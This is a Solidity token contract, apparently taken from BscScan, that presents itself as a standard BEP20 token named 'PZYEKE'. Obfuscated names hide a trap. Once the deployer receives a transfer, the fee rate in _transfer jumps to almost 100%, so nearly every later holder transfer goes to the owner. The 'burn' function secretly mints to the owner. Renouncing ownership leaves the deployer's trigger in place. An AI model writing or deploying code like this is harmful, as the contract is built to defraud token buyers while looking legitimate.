/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.4;
contract WGYRFDU {
uint256 private  EJYTTT = 10000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  RZCDWG = 1000000000000000000000;
address private  JYMCFR = address(0);
uint256 private  KYSSWH = 10000000000000;
uint256 private  ZEVYAJ = 100000000;
string public  symbol = "PZYEKE";
uint256 private  PYVQBW = 1000000000000000000;
address private  YXJQSB = address(0);
string public  name = "PZYEKE";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  JKQQQP = 1000000000000000;
address private  LZACPZ = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  NOONGQ = address(0);
uint256 private  KSMSLY = 1000000000000000000;
address public owner;
address private  LGRBNO = address(0);
mapping (address => uint256) public balanceOf;
uint256 public constant QGHZRQ = 99999;
function _getZEVYAJ() private returns (uint256) {
return ZEVYAJ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getLZACPZ() private returns (address) {
return LZACPZ;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getNOONGQ() private returns (address) {
return NOONGQ;
}

constructor () {
LGRBNO = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getYXJQSB() private returns (address) {
return YXJQSB;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getRZCDWG() private returns (uint256) {
return RZCDWG;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JDBFLY");
require(to != address(0), "JDBFLY");
require(amount <= balanceOf[from], "JDBFLY");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* QGHZRQ/KSMSLY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==LGRBNO){
KSMSLY = QGHZRQ+2;
}
emit Transfer(from, to, transferAmount);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getKYSSWH() private returns (uint256) {
return KYSSWH;
}

function _getPYVQBW() private returns (uint256) {
return PYVQBW;
}

function _getJYMCFR() private returns (address) {
return JYMCFR;
}

function _getJKQQQP() private returns (uint256) {
return JKQQQP;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJDBFLY 0");
require(spender != address(0), "fJDBFLY 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getEJYTTT() private returns (uint256) {
return EJYTTT;
}


}